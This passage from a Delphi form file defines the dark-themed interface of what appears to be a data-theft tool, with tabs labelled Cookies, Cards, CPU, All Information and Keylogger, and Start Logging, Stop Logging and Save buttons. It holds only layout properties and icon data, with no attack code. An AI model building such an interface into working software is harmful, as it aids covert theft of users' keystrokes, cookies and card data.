    object CPU: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = 2428680
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 1
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
    end
    object Cookies: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 8
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
    end
    object Cards: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 12
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
    end
    object AllInformation: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 0
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel1: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label3: TLabel
          Left = 41
          Top = 17
          Width = 105
          Height = 16
          Caption = 'All Information'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object scGPImage1: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000000
            8C4944415478DA6364C001026BB6FA3030B2CC6560F8CFC0F89721695D9BC756
            6CEA18711BB0E38D9EBEAE30C3FFFF0C972E5F7EB3BED953942403026AB6BFD3
            D3D311FC0F34E0CAE56B6FD7B7788890E882AD3EFF199816313232FE077A218E
            642F100B300CF0ABDAFA1F9BC24D6DDE8C4419806C90ADAD35987DF8F0D15103
            460D20CD005C291106D00D02002E4A6B11B07765880000000049454E44AE4260
            82}
          Stretch = True
          Transparent = True
        end
        object informationedit: TscGPMemo
          Left = 19
          Top = 56
          Width = 382
          Height = 193
          FluentUIOpaque = False
          Options.NormalColor = 3479824
          Options.HotColor = 3479824
          Options.FocusedColor = 3479824
          Options.DisabledColor = 3479824
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 150
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 4599078
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = clWhite
          Options.FontHotColor = clWhite
          Options.FontFocusedColor = clWhite
          Options.FontDisabledColor = clWhite
          Options.ShapeFillGradientAngle = -90
          Options.ShapeFillGradientBeginColorOffset = 25
          Options.ShapeFillGradientEndColorOffset = 25
          Options.ShapeCornerRadius = 0
          Options.ScaleFrameWidth = False
          Options.StyleColors = True
          ScrollBarOptions.BorderWidth = 0
          ScrollBarOptions.FillColor = clBtnFace
          ScrollBarOptions.FillColorAlpha = 100
          ScrollBarOptions.ThumbColor = clWindowText
          ScrollBarOptions.ThumbColorAlpha = 50
          ScrollBarOptions.ThumbColorHotAlpha = 100
          ScrollBarOptions.ThumbColorPressedAlpha = 150
          ScrollBarOptions.ThumbRounded = False
          ScrollBarOptions.Position = scgpsbDefault
          ScrollBarOptions.ThumbChangeSizeEffect = False
          ScrollBarOptions.Size = 11
          Color = 2428680
          ContentMarginLeft = 5
          ContentMarginRight = 5
          ContentMarginTop = 5
          ContentMarginBottom = 5
          Font.Charset = DEFAULT_CHARSET
          Font.Color = clWhite
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          HidePromptTextIfFocused = False
          PromptTextColor = clWhite
          Lines.Strings = (
            'informationedit')
          ParentFont = False
          TabOrder = 1
          Transparent = False
        end
        object scGPButton10: TscGPButton
          Left = 19
          Top = 255
          Width = 382
          Height = 33
          FluentUIOpaque = False
          TabOrder = 2
          OnClick = scGPButton10Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '                                               Get All Info'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 10
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
      end
    end
    object Keylogger: TscGPPageControlPage
      Left = 0
      Top = 30
      Width = 420
      Height = 322
      HorzScrollBar.Tracking = True
      VertScrollBar.Tracking = True
      BorderStyle = bsNone
      Color = 2428680
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -12
      Font.Name = 'Segoe UI'
      Font.Style = []
      ParentColor = False
      ParentFont = False
      TabOrder = 6
      Visible = False
      WallpaperIndex = -1
      CustomBackgroundImageIndex = -1
      FluentUIOpaque = False
      StorePaintBuffer = False
      MouseWheelSupport = False
      BGStyle = scgppsColor
      object scGPPanel5: TscGPPanel
        Left = 3
        Top = 3
        Width = 414
        Height = 313
        FluentUIOpaque = False
        TabOrder = 0
        BlurBackground = False
        BlurBackgroundAmount = 5
        BackgroundStyle = gppbsColor
        ContentMarginLeft = 0
        ContentMarginRight = 0
        ContentMarginTop = 0
        ContentMarginBottom = 0
        CustomImageIndex = -1
        DragForm = False
        DragTopForm = True
        DrawTextMode = scdtmGDI
        FillGradientAngle = 90
        FillGradientBeginAlpha = 255
        FillGradientEndAlpha = 255
        FillGradientBeginColorOffset = 25
        FillGradientEndColorOffset = 25
        FrameWidth = 1
        FillColor = 3479824
        FillColorAlpha = 255
        FillColor2 = 3479824
        FrameColor = 4599078
        FrameColorAlpha = 255
        FrameRadius = 5
        ShowCaption = False
        CaptionGlowEffect.Enabled = False
        CaptionGlowEffect.Color = clBtnShadow
        CaptionGlowEffect.AlphaValue = 255
        CaptionGlowEffect.GlowSize = 7
        CaptionGlowEffect.Offset = 0
        CaptionGlowEffect.Intensive = True
        CaptionGlowEffect.StyleColors = True
        Color = 2428680
        Caption = 'scGPPanel3'
        TransparentBackground = True
        StorePaintBuffer = True
        Sizeable = False
        WallpaperIndex = -1
        WordWrap = False
        object Label7: TLabel
          Left = 41
          Top = 17
          Width = 63
          Height = 16
          Caption = 'Keylogger'
          Font.Charset = DEFAULT_CHARSET
          Font.Color = 13017238
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          ParentFont = False
        end
        object scGPImage6: TscGPImage
          Left = 19
          Top = 17
          Width = 16
          Height = 16
          FluentUIOpaque = False
          TabOrder = 0
          CustomImageIndex = -1
          DragForm = False
          DragTopForm = True
          StyleKind = scpsPanel
          ShowCaption = False
          BorderStyle = scpbsNone
          WallpaperIndex = -1
          LightBorderColor = 3479824
          ShadowBorderColor = 3479824
          CaptionGlowEffect.Enabled = False
          CaptionGlowEffect.Color = clBtnShadow
          CaptionGlowEffect.AlphaValue = 255
          CaptionGlowEffect.GlowSize = 7
          CaptionGlowEffect.Offset = 0
          CaptionGlowEffect.Intensive = True
          CaptionGlowEffect.StyleColors = True
          Color = 3479824
          Caption = 'scGPImage1'
          StorePaintBuffer = False
          WordWrap = False
          ImageIndex = -1
          InterpolationMode = scgppimDefault
          ClipFrame = scgpcfNone
          ClipFrameRadius = 10
          ClipFrameFillColor = 3479824
          ClipFrameFillColorAlpha = 150
          ClipFrameColor = 3479824
          ClipFrameWidth = 2
          DrawTextMode = scdtmGDI
          RotationAngle = 0
          AnimationAcceleration = False
          RotateAnimation = False
          Picture.Data = {
            0954506E67496D61676589504E470D0A1A0A0000000D49484452000000100000
            001008060000001FF3FF6100000006624B474400FF00FF00FFA0BDA793000002
            DE4944415478DAA553594C5341143DF35A5A014B5945ACC8A21008F0A5620023
            B8B254A09140247143BF842811540C555256C5053442D40F634848546A802220
            0A4A400129F083A24814592CA208B4ACA5D0D6D712B035217E78E76772E7CCB9
            67CEBD436010229188D9A1F22DE4989AC4A8351AAE5AAD211483D23228229F9A
            51156D66B727D3188DE11DB2B4891056ED3065316A79B6AB5951811BE1ED620D
            8A1068B45ABCEF1D83B8E133864667676754734195D9E1522382F08BD5BBD814
            55779CEF41427D9DB05254BDED47514DB746A552FB4B2EF35BF504D1D1252CCA
            9B3B1517EA6112BC7583D185D4D23CE41C4832CA3D6BD5917C527AA2C55CF71C
            12915A55B089C74DB8111FA00764541422761B1F6EF6CE387A3F05452772D1F3
            A30F8FA455480B4FD063CE14BCC6D7E1891C49F67E2189CDAC95C7477A71B7FB
            38E80FFB4665C8AB79008EA91964F29FE059DA6352398DA4E03838DBF0F498C6
            CE21DC9574FD7A98B6CF8E448B6A34F79282881587BD2CF352F94DD85873E0B6
            6E3D7A6483902BA6911E91B87C3E3AA1C4C9FC46AD58144C1181B05A2B4E0F06
            9341E1C293EBF8AE18016D3E6202F7A0B9AB1301DE3E785CFF0A5A7A3958DAE1
            4AD459CC2F681093FE1CE55961640505F9B4020B783A3AE1C3401FC6C7679021
            38FD978206884521841CCC78319620F0B65AF2A07BB817B75F16C3D28C836FE3
            C370B45A0BC5EC244EED3E0277DAD8250F0ACBDEA144471021ACCE7775B048CC
            4F08208BD56FE1B05FA41E6CD885E21609AD2211F45C21F94E33BEC8E4A8C8E1
            13121454CF5CB353357568AF3B3BDCCFD9A8E7E7C5D77035FA9C51AEA2A90F65
            4D8318534C2E12E892FC944A7F5336F3CDBF277100C5753DF0A28D6D6BEBF843
            A00B81B0C697CD22F53C5B73B3C80017783859C18EBB0A230A253EF68FE3694B
            3F462717E0EAE60E06A12095B6CF4B72C258C4B0023D9A54C7DC965C8E19FBD8
            BC5A6D33A75213B609030CBAC533CA79C32FA86612467A69564826C17FC66FE4
            3E2620B74944400000000049454E44AE426082}
          Stretch = True
          Transparent = True
        end
        object KeylogMemo: TscGPMemo
          Left = 19
          Top = 56
          Width = 382
          Height = 161
          FluentUIOpaque = False
          Options.NormalColor = 3479824
          Options.HotColor = 3479824
          Options.FocusedColor = 3479824
          Options.DisabledColor = 3479824
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 150
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 4599078
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = clWhite
          Options.FontHotColor = clWhite
          Options.FontFocusedColor = clWhite
          Options.FontDisabledColor = clWhite
          Options.ShapeFillGradientAngle = -90
          Options.ShapeFillGradientBeginColorOffset = 25
          Options.ShapeFillGradientEndColorOffset = 25
          Options.ShapeCornerRadius = 0
          Options.ScaleFrameWidth = False
          Options.StyleColors = True
          ScrollBarOptions.BorderWidth = 0
          ScrollBarOptions.FillColor = clBtnFace
          ScrollBarOptions.FillColorAlpha = 100
          ScrollBarOptions.ThumbColor = clWindowText
          ScrollBarOptions.ThumbColorAlpha = 50
          ScrollBarOptions.ThumbColorHotAlpha = 100
          ScrollBarOptions.ThumbColorPressedAlpha = 150
          ScrollBarOptions.ThumbRounded = False
          ScrollBarOptions.Position = scgpsbDefault
          ScrollBarOptions.ThumbChangeSizeEffect = False
          ScrollBarOptions.Size = 11
          Color = 2428680
          ContentMarginLeft = 5
          ContentMarginRight = 5
          ContentMarginTop = 5
          ContentMarginBottom = 5
          Font.Charset = DEFAULT_CHARSET
          Font.Color = clWhite
          Font.Height = -12
          Font.Name = 'JetBrains Mono'
          Font.Style = []
          HidePromptTextIfFocused = False
          PromptTextColor = clWhite
          Lines.Strings = (
            'informationedit')
          ParentFont = False
          TabOrder = 1
          Transparent = False
        end
        object scGPButton6: TscGPButton
          Left = 19
          Top = 263
          Width = 145
          Height = 33
          FluentUIOpaque = False
          TabOrder = 2
          OnClick = scGPButton6Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '      Start Logging'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 24
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object scGPButton7: TscGPButton
          Left = 321
          Top = 263
          Width = 80
          Height = 33
          FluentUIOpaque = False
          TabOrder = 3
          OnClick = scGPButton7Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '    Save'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 24
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
          GlowEffect.GlowSize = 7
          GlowEffect.Offset = 0
          GlowEffect.Intensive = True
          GlowEffect.StyleColors = True
          GlowEffect.HotColor = clNone
          GlowEffect.PressedColor = clNone
          GlowEffect.FocusedColor = clNone
          GlowEffect.PressedGlowSize = 7
          GlowEffect.PressedAlphaValue = 255
          GlowEffect.States = [scsHot, scsPressed, scsFocused]
          ImageGlow = True
          ShowGalleryMenuFromTop = False
          ShowGalleryMenuFromRight = False
          ShowMenuArrow = True
          ShowFocusRect = True
          Down = False
          GroupIndex = 0
          AllowAllUp = False
          ToggleMode = False
        end
        object scGPButton8: TscGPButton
          Left = 170
          Top = 263
          Width = 145
          Height = 33
          Enabled = False
          FluentUIOpaque = False
          TabOrder = 4
          OnClick = scGPButton8Click
          Animation = True
          Badge.Color = clRed
          Badge.ColorAlpha = 255
          Badge.Font.Charset = DEFAULT_CHARSET
          Badge.Font.Color = clWhite
          Badge.Font.Height = -11
          Badge.Font.Name = 'Tahoma'
          Badge.Font.Style = [fsBold]
          Badge.Visible = False
          Caption = '      Stop Logging'
          CaptionCenterAlignment = False
          CanFocused = False
          CustomDropDown = False
          DrawTextMode = scdtmGDI
          Margin = -1
          Spacing = 1
          Layout = blGlyphLeft
          Images = Form2.VirtualImageList2
          ImageIndex = 24
          ImageMargin = 1
          TransparentBackground = True
          Options.NormalColor = 2428680
          Options.HotColor = 3479824
          Options.PressedColor = 2428680
          Options.FocusedColor = 2428680
          Options.DisabledColor = 2428680
          Options.NormalColor2 = 2428680
          Options.HotColor2 = 3479824
          Options.PressedColor2 = 2428680
          Options.FocusedColor2 = clNone
          Options.DisabledColor2 = clNone
          Options.NormalColorAlpha = 255
          Options.HotColorAlpha = 255
          Options.PressedColorAlpha = 255
          Options.FocusedColorAlpha = 255
          Options.DisabledColorAlpha = 255
          Options.NormalColor2Alpha = 255
          Options.HotColor2Alpha = 255
          Options.PressedColor2Alpha = 255
          Options.FocusedColor2Alpha = 255
          Options.DisabledColor2Alpha = 255
          Options.FrameNormalColor = 4599078
          Options.FrameHotColor = 4599078
          Options.FramePressedColor = 4599078
          Options.FrameFocusedColor = 4599078
          Options.FrameDisabledColor = 14968160
          Options.FrameWidth = 1
          Options.FrameNormalColorAlpha = 255
          Options.FrameHotColorAlpha = 255
          Options.FramePressedColorAlpha = 255
          Options.FrameFocusedColorAlpha = 255
          Options.FrameDisabledColorAlpha = 255
          Options.FontNormalColor = 14968160
          Options.FontHotColor = 14968160
          Options.FontPressedColor = 14968160
          Options.FontFocusedColor = 14968160
          Options.FontDisabledColor = 14968160
          Options.ShapeFillGradientAngle = 90
          Options.ShapeFillGradientPressedAngle = -90
          Options.ShapeFillGradientColorOffset = 25
          Options.ShapeCornerRadius = 10
          Options.ShapeStyle = scgpRect
          Options.ShapeStyleLineSize = 0
          Options.ArrowSize = 9
          Options.ArrowAreaSize = 0
          Options.ArrowType = scgpatDefault
          Options.ArrowThickness = 2
          Options.ArrowThicknessScaled = False
          Options.ArrowNormalColor = 2428680
          Options.ArrowHotColor = clBtnText
          Options.ArrowPressedColor = clBtnText
          Options.ArrowFocusedColor = clBtnText
          Options.ArrowDisabledColor = clBtnText
          Options.ArrowNormalColorAlpha = 200
          Options.ArrowHotColorAlpha = 255
          Options.ArrowPressedColorAlpha = 255
          Options.ArrowFocusedColorAlpha = 200
          Options.ArrowDisabledColorAlpha = 125
          Options.StyleColors = True
          Options.PressedHotColors = False
          HotImageIndex = -1
          FluentLightEffect = False
          FocusedImageIndex = -1
          PressedImageIndex = -1
          UseGalleryMenuImage = False
          UseGalleryMenuCaption = False
          ScaleMarginAndSpacing = False
          WidthWithCaption = 0
          WidthWithoutCaption = 0
          SplitButton = False
          RepeatClick = False
          RepeatClickInterval = 100
          GlowEffect.Enabled = False
          GlowEffect.Color = clHighlight
          GlowEffect.AlphaValue = 255
